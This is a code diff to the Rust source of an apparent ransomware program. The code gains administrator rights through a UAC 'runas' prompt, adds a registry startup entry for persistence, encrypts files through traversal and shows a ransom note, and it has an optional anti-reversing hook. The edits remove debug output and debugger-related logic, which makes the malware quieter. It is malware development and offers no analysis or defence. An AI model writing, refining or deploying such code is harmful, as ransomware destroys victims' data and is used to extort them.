@@ -31,20 +31,12 @@ fn main() {
     // Uncomment this line to use anti-reversing
     // anti_reversing();
 
-    if !already_encrypted() {
-        if check_elevation() {
-            println!("Elevated! Yay!");
-        } else {
-            println!("Not elevated. Requesting UAC.");
+    if !is_already_encrypted() {
+        if !check_elevation() {
             process::exit(0);
         }
 
-        if add_registry_startup() {
-            println!("Successfully added registry for startup.");
-        } else {
-            println!("Failed to add registry for startup.");
-        }
-
+        add_registry_startup();
         traverse_and_encrypt();
 
         if !display_ransom_note() {
@@ -71,7 +63,6 @@ fn add_registry_startup() -> bool {
             &mut registry_handle,
         ) != 0
         {
-            println!("Failed to open registry key.");
             RegCloseKey(registry_handle);
             return false;
         }
@@ -110,7 +101,6 @@ fn add_registry_startup() -> bool {
                 length,
             ) != 0
             {
-                println!("Failed to set registry key.");
                 RegCloseKey(registry_handle);
                 return false;
             } else {
@@ -118,7 +108,6 @@ fn add_registry_startup() -> bool {
                 return true;
             }
         } else {
-            println!("Registry key already exists.");
             RegCloseKey(registry_handle);
             return false;
         }
@@ -137,7 +126,6 @@ fn check_elevation() -> bool {
         if is_user_elevated() {
             return true;
         } else {
-            println!("Not elevated yet. Requesting elevation.");
             ShellExecuteA(
                 null_mut(),
                 CString::new("runas").unwrap().as_ptr(),
@@ -149,10 +137,6 @@ fn check_elevation() -> bool {
         }
         return false;
     }
-}
-
-fn already_encrypted() -> bool {
-    is_debugger_present()
 }
 
 fn is_user_elevated() -> bool {
